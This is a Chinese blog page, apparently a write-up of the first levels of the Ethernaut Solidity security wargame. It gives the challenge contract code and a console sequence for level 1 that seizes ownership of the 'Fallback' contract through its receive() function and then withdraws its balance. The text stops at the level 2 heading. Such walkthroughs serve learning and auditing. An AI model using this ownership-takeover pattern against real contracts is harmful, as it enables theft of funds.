<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="henry">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2026/01/29/ethereum_challenge/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="0. Hello Ethernaut进入界面，然后打开控制台见如下界面  这道题主要是用来介绍如何使用控制台交互合约以及 MetaMask 交互，按提示可以一步一步完成。 123456789await contract.info()await contract.info1()await contract.info2(&quot;hello&quot;)await contract.infoNum()await con">
<meta property="og:type" content="article">
<meta property="og:title" content="ethernaut chall Part.I">
<meta property="og:url" content="http://example.com/2026/01/29/ethereum_challenge/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="0. Hello Ethernaut进入界面，然后打开控制台见如下界面  这道题主要是用来介绍如何使用控制台交互合约以及 MetaMask 交互，按提示可以一步一步完成。 123456789await contract.info()await contract.info1()await contract.info2(&quot;hello&quot;)await contract.infoNum()await con">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-20_14-14-04.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-20_14-26-44.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-20_15-54-21.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-21_14-19-26.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-21_15-30-05.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-21_15-32-25.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-11_11-52-12.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-21_15-33-49.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-08-21_15-34-35.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2026-01-28_22-13-07.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-11_22-11-48.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2026-01-28_22-30-01.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2026-01-28_22-44-45.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-12_12-05-45.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-13_12-27-41.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-13_12-27-52.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2026-01-28_23-12-51.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-18_00-14-39.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-18_10-22-17.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-18_20-22-12.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-18_21-02-57.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-12-18_23-18-50.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2026-01-29_01-10-01.png">
<meta property="article:published_time" content="2026-01-28T16:46:53.574Z">
<meta property="article:modified_time" content="2026-01-28T17:11:54.080Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="ether">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-08-20_14-14-04.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/icon.png">
    <!--- Page Info-->
    
    <title>
        
            ethernaut chall Part.I -
        
        Henry Martin
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Henry Martin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories/"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/tags"  >
                                    
                                        
                                            <i class="fa-regular fa-tags"></i>
                                        
                                        TAGS
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/links/">LINKS
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories/"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/tags"  >
                             
                                
                                    <i class="fa-regular fa-tags"></i>
                                
                                TAGS
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/links/">LINKS</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/Snipaste_2024-08-20_14-14-04.png" alt="ethernaut chall Part.I" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">ethernaut chall Part.I</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/henry.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2026-01-29 00:46:53</span>
        <span class="mobile">2026-01-29 00:46:53</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2026-01-29 01:11:54</span>
            <span class="mobile">2026-01-29 01:11:54</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/blockchain/">blockchain</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/blockchain/security/">security</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/solidity/">solidity</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/ether/">ether</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/security/">security</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0. Hello Ethernaut"></a>0. Hello Ethernaut</h2><p>进入界面，然后打开控制台见如下界面</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-20_14-14-04.png" alt="nipaste_2024-08-20_14-14-0"></p>
<p>这道题主要是用来介绍如何使用控制台交互合约以及 MetaMask 交互，按提示可以一步一步完成。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">await contract.info()</span><br><span class="line">await contract.info1()</span><br><span class="line">await contract.info2(<span class="string">"hello"</span>)</span><br><span class="line">await contract.infoNum()</span><br><span class="line">await contract.info42()</span><br><span class="line">await contract.theMethodName()</span><br><span class="line">await contract.method7123949()</span><br><span class="line">await contract.password()</span><br><span class="line">await contract.authenticate(<span class="string">"ethernaut0"</span>)</span><br></pre></td></tr></table></figure></div>

<p>输入完，提交instance即可。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-20_14-26-44.png" alt="nipaste_2024-08-20_14-26-4"></p>
<p>最后刚刚交互的整个合约代码如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Instance</span> {</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = <span class="number">42</span>;</span><br><span class="line">    string public theMethodName = <span class="string">"The method name is method7123949."</span>;</span><br><span class="line">    bool private cleared = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// constructor</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _password</span>) {</span><br><span class="line">        password = _password;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">info</span>(<span class="params"></span>) public pure returns (string memory) {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You will find what you need in info1()."</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">info1</span>(<span class="params"></span>) public pure returns (string memory) {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Try info2(), but with "hello" as a parameter.'</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">info2</span>(<span class="params">string memory param</span>) public pure returns (string memory) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(param)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">"hello"</span>))) {</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"The property infoNum holds the number of the next info method to call."</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Wrong parameter."</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">info42</span>(<span class="params"></span>) public pure returns (string memory) {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"theMethodName is the name of the next method."</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">method7123949</span>(<span class="params"></span>) public pure returns (string memory) {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"If you know the password, submit it to authenticate()."</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params">string memory passkey</span>) public {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(passkey)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(password))) {</span><br><span class="line">            cleared = <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getCleared</span>(<span class="params"></span>) public view returns (bool) {</span><br><span class="line">        <span class="keyword">return</span> cleared;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>





<h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h2><p><strong>目标：</strong></p>
<ul>
<li>成为合约的owner</li>
<li>将余额减少为0</li>
</ul>
<p><strong>合约代码：</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallback</span> {</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line">	<span class="comment">//owner 被设置为部署合约的账户地址 (msg.sender)，同时，合约部署者的贡献值被初始化为 1000 以太币 (1 ether 是 Solidity 中的单位，表示 1 ETH)</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) {</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">        contributions[msg.<span class="property">sender</span>] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">//modifier onlyOwner()：定义了一个名为 onlyOwner 的修饰符。修饰符的名字可以是任意的，但通常会反映它的功能</span></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">"caller is not the owner"</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">// 将合约所属者移交给贡献最高的人，这也意味着你必须要贡献1000ETH以上才有可能成为合约的owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contribute</span>(<span class="params"></span>) public payable {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &lt; <span class="number">0.001</span> ether);</span><br><span class="line">        contributions[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (contributions[msg.<span class="property">sender</span>] &gt; contributions[owner]) {</span><br><span class="line">            owner = msg.<span class="property">sender</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getContribution</span>(<span class="params"></span>) public view returns (uint256) {</span><br><span class="line">        <span class="keyword">return</span> contributions[msg.<span class="property">sender</span>];</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">//首先，onlyOwner 修饰符中的 require 语句会检查调用者 (msg.sender) 是否是合约的所有者，如果检查通过（msg.sender == owner），函数继续执行</span></span><br><span class="line">    <span class="comment">//这个函数将合约中所有的以太币余额转移到所有者账户中	</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public onlyOwner {</span><br><span class="line">        <span class="title function_">payable</span>(owner).<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">//receive 是一个特殊的函数，当合约接收到以太币而没有调用任何函数时，它会被自动调用</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span> &amp;&amp; contributions[msg.<span class="property">sender</span>] &gt; <span class="number">0</span>);</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>先来审计上面的合约代码，能修改合约 owner 的地方总共有三处，第一处构造函数<code>constructor</code>，显然我们无法在这里修改owner。第二处<code>contribute()</code>，但这个函数要求我们贡献1000eth才可以成为合约的owner，显然也不违背了我们的初衷（笑）。第三处<code> receive()</code>，这个函数在发生交易时，会被自动调用，且会将owner设置为消息发送者，因此我们需要利用这个函数。</p>
<p>来看看触发条件</p>
<ul>
<li>msg.value &gt; 0：contract.sendTransaction({value:1}) 即可</li>
<li>contributions[msg.sender] &gt; 0：可以通过调用 contribute 来实现</li>
</ul>
<p>所以说最终攻击代码如下：</p>
<div class="highlight-container" data-rel="Scss"><figure class="iseeu highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">await contract<span class="selector-class">.contribute</span>({value: toWei("<span class="number">0.0001</span>")})</span><br><span class="line">await contract<span class="selector-class">.sendTransaction</span>({value: toWei("<span class="number">0.0001</span>")})</span><br><span class="line">contract<span class="selector-class">.owner</span>()</span><br><span class="line">contract<span class="selector-class">.withdraw</span>()	<span class="comment">//这个函数将合约中所有的以太币余额转移到所有者账户中	</span></span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-20_15-54-21.png" alt="nipaste_2024-08-20_15-54-2"></p>
<h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h2><p><strong>目标</strong></p>
<p>获取合约的owner权限</p>
<p><strong>合约代码</strong></p>
